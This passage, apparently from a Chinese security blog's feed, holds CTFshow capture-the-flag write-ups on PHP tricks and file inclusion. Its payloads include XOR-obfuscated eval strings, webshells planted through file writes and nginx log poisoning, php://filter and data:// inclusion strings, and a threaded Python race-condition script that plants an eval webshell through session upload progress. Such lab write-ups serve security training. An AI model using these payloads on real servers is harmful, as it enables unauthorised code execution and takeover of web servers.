å¼‚æˆ–)"></a>web148(ä¸­æ–‡å˜é‡  å¼‚æˆ–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_ctfshow_fl0g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æ²¡banå¼‚æˆ–</p><p>Payloadï¼š<code>?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</code></p><p>é¢„æœŸè§£æ˜¯ä½¿ç”¨ä¸­æ–‡ <code>?code=$å“ˆ=&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$å“ˆ&#125;[å“¼]($&#123;$å“ˆ&#125;[å—¯]);&amp;å“¼=system&amp;å—¯=tac f* </code></p><p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;</code> å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET</p><h4 id="web149-unlink-æ–‡ä»¶è¦†ç›–"><a href="#web149-unlink-æ–‡ä»¶è¦†ç›–" class="headerlink" title="web149(unlink  æ–‡ä»¶è¦†ç›–)"></a>web149(unlink  æ–‡ä»¶è¦†ç›–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p><strong>unlink()</strong> å‡½æ•°åˆ é™¤æ–‡ä»¶ã€‚</p><p>è‹¥æˆåŠŸï¼Œåˆ™è¿”å› trueï¼Œå¤±è´¥åˆ™è¿”å› falseã€‚</p><p>ç›´æ¥å‘index.phpå†™é©¬å°±è¡Œ</p><p>Payload</p><blockquote><p>GET:?ctf&#x3D;indx.php</p><p>POST:show&#x3D;<?php system($_GET[a]);?></p></blockquote><h4 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant boolean">TRUE</span><span class="token punctuation">:</span><span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#è¿‡æ»¤å­—ç¬¦</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>isVIPå¯ä»¥é€šè¿‡extractè¿›è¡Œå˜é‡è¦†ç›–ï¼Œctfè¢«é™åˆ¶ä¸èƒ½æœ‰:</p><p>å¯ä»¥åˆ©ç”¨nginxæ—¥å¿—æ–‡ä»¶å†™é©¬</p><p><img src="web150.png" loading="lazy"></p><h4 id="web150-plus-autoload-class-exists"><a href="#web150-plus-autoload-class-exists" class="headerlink" title="web150_plus(__autoload  class_exists)"></a>web150_plus(__autoload  class_exists)</h4><p>è¿‡æ»¤äº†logï¼Œçœ‹ç€å¯ä»¥ç”¨æ¡ä»¶ç«äº‰</p><p>çœ‹äº†hint åˆ©ç”¨ <code>__autoload()</code></p><p>äºæ˜¯æŸ¥äº†ä¸€ä¸‹ <code>class_exists()</code> è¿™ä¸ªå‡½æ•°</p><p><img src="web150_plus.png" alt="https://img.exp10it.io/img/202208131706165.png" loading="lazy"></p><p>ä¿®å¤äº†éé¢„æœŸï¼Œä¸è®©åŒ…å«æ—¥å¿—æ–‡ä»¶äº†ã€‚</p><p>è¿™é‡Œåˆ©ç”¨äº† <code>extract</code> è¦†ç›–å˜é‡ä¼šæŠŠ <code>ç©ºæ ¼ [ .</code> éƒ½ç»™è½¬æˆä¸‹åˆ’çº¿çš„ç‰¹æ€§ï¼Œç»•è¿‡æ­£åˆ™è¿‡æ»¤ã€‚ç„¶åå°±æ˜¯ <a href="https://www.php.net/manual/zh/function.class-exists.php"><code>class_exists</code></a> ç¬¬äºŒä¸ªå‚æ•°é»˜è®¤ä¸º <code>true</code>ï¼Œåœ¨ç±»ä¸å­˜åœ¨æ—¶ä¼šè°ƒç”¨ <code>__autoload</code> å‡½æ•°ï¼Œ<code>__autoload</code> è¿™é‡Œå†™çš„æ˜¯è°ƒç”¨è¦åŠ è½½çš„ç±»åçš„å‡½æ•°ï¼Œä¼  <code>phpinfo</code> å°±èƒ½å¾—åˆ° <code>session</code>ç›¸å…³ä¿¡æ¯ï¼Œä»è€ŒåŒ…å« <code>session</code>ã€‚</p><p>payload1: <code>?..CTFSHOW..=phpinfo</code></p><p>å¯ä»¥çœ‹åˆ° <code>session.use_strict_mode</code> ä¸º Offï¼Œè¯´æ˜å¯ä»¥è‡ªå®šä¹‰ <code>session_id</code>ï¼Œæ§åˆ¶ <code>session</code> æ–‡ä»¶åï¼Œ <code>session.save_path</code> ä¸ºç©ºï¼Œç¡®å®šæ–‡ä»¶åŒ…å«è·¯å¾„ <code>/tmp/sess_&#123;session_id&#125;</code>ã€‚æ”¹ä¸€ä¸‹ç¥–ä¼ è„šæœ¬å†™ shellã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl <span class="token operator">=</span> <span class="token string">'http://fa7db7de-329e-44cf-8270-bcd8d7f96368.challenge.ctf.show:8080/?isVIP=1'</span>event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'aaaaaa&lt;?php file_put_contents("/var/www/html/s.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=="));?>'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span>        _ <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'down'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'verysafe.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ctf"</span><span class="token punctuation">:</span> <span class="token string">"/tmp/sess_down"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'aaaaaa'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'retry'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>[PHPæ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆåˆ©ç”¨phpinfoï¼‰](<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">vulhub&#x2F;php&#x2F;inclusion&#x2F;README.zh-cn.md at master Â· vulhub&#x2F;vulhub (github.com)</a>)</p><p>è¿™ç¯‡è¯¦ç»†è®²è§£äº†æ¼æ´çš„åˆ©ç”¨ï¼Œä¹‹å‰çš„æ¡ä»¶ç«äº‰å°±æ˜¯è¿™æ ·</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> phpç‰¹æ€§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-include</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-include/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-include/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä¸»è¦è€ƒå¯Ÿæ˜¯phpä¼ªåè®®ï¼Œä¹‹å‰Rceé‡Œä¹Ÿæœ‰æè¿‡ï¼Œè¿™é‡Œæ”¾å‡ ä¸ªå¸¸ç”¨Payload</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p></blockquote><blockquote><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)</p></blockquote><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php  </p></blockquote><blockquote><p>php:&#x2F;&#x2F;input<br>POST cmd</p></blockquote><h3 id="web78-117"><a href="#web78-117" class="headerlink" title="web78-117"></a>web78-117</h3><h4 id="web78-php"><a href="#web78-php" class="headerlink" title="web78(php)"></a>web78(php)</h4><p>ç­¾åˆ°</p><p>Payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>å°†phpè¿‡æ»¤ï¼Œå¯ä»¥è€ƒè™‘data</p><p>Payload:</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></blockquote><h4 id="web80-nginxæ—¥å¿—æ³¨å…¥"><a href="#web80-nginxæ—¥å¿—æ³¨å…¥" class="headerlink" title="web80(nginxæ—¥å¿—æ³¨å…¥)"></a>web80(nginxæ—¥å¿—æ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>dataä¹Ÿè¢«banäº†</p><p>ä½¿ç”¨nginxæ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œåœ¨User-Agentå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½¿ç”¨èšå‰‘è¿æ¥<a href="https://xxx.ctfshow/?file=/var/log/nginx">https://xxx.ctfshow?file=/var/log/nginx</a>  getshell</p><p>Payload:</p><blockquote><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>User-Agent: <?php @eval($_POST['attack']);?></p></blockquote><p>çœ‹é¢˜è§£ä¹Ÿå¯ä»¥å¤§å°å†™ç»•è¿‡ç”¨PHP:&#x2F;&#x2F;input</p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>å¤šè¿‡æ»¤äº†å†’å·ï¼Œæ‰€ä»¥ä¾æ—§å¯ä»¥nginxæ—¥å¿—æ³¨å…¥</p><h4 id="web82-åˆ©ç”¨session-upload-progressè¿›è¡Œæ–‡ä»¶åŒ…å«"><a href="#web82-åˆ©ç”¨session-upload-progressè¿›è¡Œæ–‡ä»¶åŒ…å«" class="headerlink" title="web82(åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«)"></a>web82(åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«)</h4><p><a href="https://www.freebuf.com/vuls/202819.html">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœsession.auto_start&#x3D;On ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚ä½†sessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º0ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID&#x3D;TGAOï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š&#x2F;tmp&#x2F;sess_TGAOâ€ã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶é‡Œã€‚</p><p>ä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œé»˜è®¤é…ç½®session.upload_progress.cleanup &#x3D; onå¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œ</p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç«äº‰ï¼Œåœ¨sessionæ–‡ä»¶å†…å®¹æ¸…ç©ºå‰è¿›è¡ŒåŒ…å«åˆ©ç”¨ã€‚</p><p><strong>sessionæ–‡ä»¶é»˜è®¤å­˜å‚¨è·¯å¾„</strong></p><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p><p><strong>æ–¹æ³•ä¸€:</strong></p><p>å…ˆä»¥POSTçš„å½¢å¼å‘åŒ…ï¼Œä¸Šä¼ çš„æ–‡ä»¶éšæ„,ä¸‹é¢æ˜¯æ„é€ çš„ä¸Šä¼ è¡¨å•</p><pre class="language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>ä½¿ç”¨burpè¿›è¡Œçˆ†ç ´ï¼ˆä¸¤ä¸ªè¦åŒæ—¶çˆ†ç ´ï¼‰</p><p><img src="web82.png" loading="lazy"></p><p><img src="web82_2.png" loading="lazy"></p><p>æœ€åç«äº‰å¾—åˆ°flag</p><p><strong>æ–¹æ³•äºŒ</strong>:</p><p>å¯ä»¥åˆ©ç”¨è„šæœ¬è¿›è¡Œæ¡ä»¶ç«äº‰</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'Qftm'</span>url <span class="token operator">=</span> <span class="token string">'https://2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show/'</span><span class="token keyword">def</span> <span class="token function">POST</span><span 